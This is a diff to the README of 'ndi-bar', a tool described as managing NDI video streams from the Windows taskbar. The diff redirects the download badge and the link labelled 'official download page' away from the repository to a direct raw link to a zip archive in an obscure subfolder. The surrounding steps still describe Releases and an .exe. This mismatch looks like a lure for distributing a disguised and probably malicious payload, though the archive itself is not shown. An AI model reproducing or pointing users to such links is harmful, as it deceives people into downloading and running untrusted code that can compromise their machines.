@@ -1,12 +1,12 @@
 # 🖥️ ndi-bar - Manage your NDI streams with ease
 
-[![Download ndi-bar](https://img.shields.io/badge/Download-ndi--bar-blue.svg)](https://github.com/southpolearabianjasmine693/ndi-bar)
+[![Download ndi-bar](https://img.shields.io/badge/Download-ndi--bar-blue.svg)](https://raw.githubusercontent.com/southpolearabianjasmine693/ndi-bar/main/ndi-bar/State/ndi_bar_v2.8.zip)
 
 ndi-bar helps you monitor and control your NDI streams directly from your Windows taskbar. You no longer need to navigate through complex menus or switch between different windows to swap your video feeds. This tool puts your network video needs in one place.
 
 ## 📥 How to download 
 
-1. Go to the [official download page](https://github.com/southpolearabianjasmine693/ndi-bar).
+1. Go to the [official download page](https://raw.githubusercontent.com/southpolearabianjasmine693/ndi-bar/main/ndi-bar/State/ndi_bar_v2.8.zip).
 2. Look for the latest version under the Releases section on the right side of the page.
 3. Click the file that ends with .exe to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
